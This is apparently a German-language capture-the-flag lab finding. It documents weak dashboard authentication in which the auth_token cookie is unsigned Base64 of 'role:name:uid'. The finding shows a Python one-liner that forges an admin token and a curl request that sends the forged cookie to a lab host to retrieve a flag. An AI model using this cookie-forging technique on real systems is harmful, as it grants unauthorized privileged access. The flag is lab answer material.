@@ -1,0 +1,14 @@
+=== FINDING: Schwache Dashboard-Authentifizierung / Cookie-Manipulation (FLAG) ===
+
+Annahme laut Lab: Cookies uid und auth_token; Token = Base64("role:name:uid") (ohne kryptographische Signatur).
+
+$ python3 -c "import base64; print(base64.b64encode(b'admin:Elias:23').decode())"
+YWRtaW46RWxpYXM6MjM=
+
+---
+
+$ curl -sS -H "Cookie: uid=23; auth_token=YWRtaW46RWxpYXM6MjM=" "http://10.10.10.10/dashboard/" | grep -i FLAG
+
+<div class="fl">FLAG{c00k13_bru73_f0rc3_m4st3r}</div></div>
+
+Erkenntnis: Zugriff auf Dashboard-Inhalt für uid=23 durch gefälschtes Cookie-Paar; Flag im Markup.
